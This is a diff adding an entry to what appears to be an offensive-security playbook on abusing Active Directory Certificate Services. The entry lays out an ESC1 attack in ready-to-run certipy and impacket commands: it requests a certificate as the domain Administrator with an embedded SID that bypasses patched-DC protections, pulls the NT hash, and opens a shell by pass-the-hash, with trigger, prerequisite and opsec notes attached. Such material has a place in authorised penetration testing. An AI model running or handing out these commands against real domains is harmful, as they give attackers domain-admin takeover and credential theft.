@@ -110,3 +110,32 @@ Rubeus.exe 'asktgt /user:administrator /certificate:esc3-DA.pfx /password:Passw0
   # Step 3: Authenticate with resulting certificate
   certipy auth -pfx machine.pfx -dc-ip <DC_IP>
   ```
+
+### ESC1 via certipy with Explicit SID (Linux Native) [added: 2026-04]
+- **Tags:** #ESC1 #ADCS #certipy #UPN #SID #DomainAdmin #CertificateAbuse #EnrolleeSuppliesSubject #PKINIT
+- **Trigger:** certipy finds template with ESC1 AND your user has enrollment rights (group membership like t1_admins); need linux-native attack without Sliver/Rubeus
+- **Prereq:** Cleartext creds for enrolling user; enrollment rights on vulnerable template; ADCS CA accessible; domain SID known
+- **Yields:** PFX cert for domain admin → PKINIT TGT → NT hash for admin → SYSTEM via pass-the-hash
+- **Opsec:** Med (certificate request logged by CA)
+- **Context:** Specify `-sid` to embed the admin's object SID in the certificate, bypassing UPN-collision protections on patched DCs. Get domain SID from `whoami /groups` output — replace the last segment with `-500` for Administrator.
+- **Payload/Method:**
+  ```bash
+  # 1. Enumerate (via proxychains if LDAP not directly reachable)
+  proxychains -q certipy-ad find -u USER -p PASS -dc-ip <DC_IP> -dns-tcp -vulnerable -enabled -stdout
+
+  # 2. Request cert specifying target UPN + SID
+  proxychains -q certipy-ad req \
+    -u enrolling_user -p PASS \
+    -target-ip <DC_IP> \
+    -ca <CA_NAME> \
+    -template <TEMPLATE_NAME> \
+    -upn _admin \
+    -key-size 4096 \
+    -sid S-1-5-21-XXXX-XXXX-XXXX-500
+
+  # 3. Authenticate and retrieve NT hash
+  proxychains -q certipy-ad auth -pfx _admin.pfx -domain domain.local -dc-ip <DC_IP>
+
+  # 4. Shell
+  impacket-smbexec _admin@domain.local -hashes :NTHASH
+  ```
